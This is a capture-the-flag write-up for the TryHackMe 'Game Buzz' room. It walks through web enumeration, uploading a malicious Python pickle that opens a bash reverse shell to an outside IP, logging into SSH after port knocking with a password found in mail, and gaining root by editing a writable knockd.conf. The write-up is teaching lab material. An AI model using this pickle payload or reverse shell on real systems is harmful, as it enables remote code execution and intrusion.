# Game Buzz

![image](https://user-images.githubusercontent.com/5285547/128932672-b10c018a-8d55-4bfd-8edb-1d4100c0a480.png)

Romm link: https://tryhackme.com/room/gamebuzz

## Enum

Nmap

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Incognito
```

---
## Port 80 

Checking the main website didn't show much, apart from a button that loads a file with a .pkl extension. 

![image](https://user-images.githubusercontent.com/5285547/128937818-90d5dd7c-561d-4463-8a1c-a79311deb7b5.png)

Also we find a domain name. 

```
sudo nano /etc/hosts  
ip incognito.com
```

## dev.incognito.com

```
sudo nano etc/hosts
IP dev.incognito.com
```

http://dev.incognito.com/secret/upload/

Finding the endpoint we can try to upload a file of our own. Based on the .pkl file extension this hints at python pickle deserilization. 

## User

If we can get our file to be read from the main website we can get RCE. 

test.pkl (rev shell)

```
#!/usr/bin/env python3
import pickle, os
class pickleSerilization(object):
    def __reduce__(self):
        return (os.system,("bash -c 'bash -i >& /dev/tcp/10.8.153.120/9999 0>&1'",))
pickle.dump(pickleSerilization(), open("rev_shell", "wb"))
```
Running the code gives us the rev_shell file. Upload this at "http://dev.incognito.com/secret/upload/" then call it with the main website.

![image](https://user-images.githubusercontent.com/5285547/128940779-a030648b-e70f-49e1-b35f-53d343d13e96.png)

```
su dev2
#no password
```

Now we can access the /home/dev2/ folder to find the user flag. 

---
## User 2

We find a file called "/etc/knockd.conf" that looks intresting. I see some ports we need to knock to open SSH

```
[options]
        logfile = /var/log/knockd.log

[openSSH]
        sequence    = 5020,6120,7340
        seq_timeout = 15
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCE$
        tcpflags    = syn

[closeSSH]
        sequence    = 9000,8000,7000
        seq_timeout = 15
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJE$
        tcpflags    = syn


5020,6120,7340
```

Doing some more enumeration showed some mails for dev1 in /var/mail, with a message to let ourselfs in! 

![image](https://user-images.githubusercontent.com/5285547/129106087-17c54550-1086-4344-9ff7-01f9253d7e90.png)

Using knock I opend the SSH port then used the password to login as dev1. 

```
knock  10.10.28.93 5020 6120 7340

ssh dev1@incognito.com
dc647eb65e6711e155375218212b3964
```

![image](https://user-images.githubusercontent.com/5285547/128942276-39b99b82-3826-4ec6-a5a8-341f920dda9b.png)

---
## Root

Enumerating the system again we can see the same file popping up in linpeas with acl permissions set. 

![image](https://user-images.githubusercontent.com/5285547/128942448-bd64f8da-f086-4d76-9c72-6e728f375d2e.png)

Knowing this lets edit the file to test some command execution (as root). 

```
nano /etc/knockd.conf
```

![image](https://user-images.githubusercontent.com/5285547/129106344-16e7d82d-d738-412d-bc2d-473f2991022d.png)

After editing the file I restarted the knockd service and tried again to knock the ports. 

```
sudo /etc/init.d/knockd restart 

knock  10.10.203.141 5020 6120 7340
ls /tmp
```

![image](https://user-images.githubusercontent.com/5285547/129106804-de631ac7-c5af-498a-9bd5-9ec7395b4eb2.png)

Then call the file with the now suid bit set for root.

![image](https://user-images.githubusercontent.com/5285547/129106866-21667040-40c7-4da3-8856-911d185dd7f1.png)





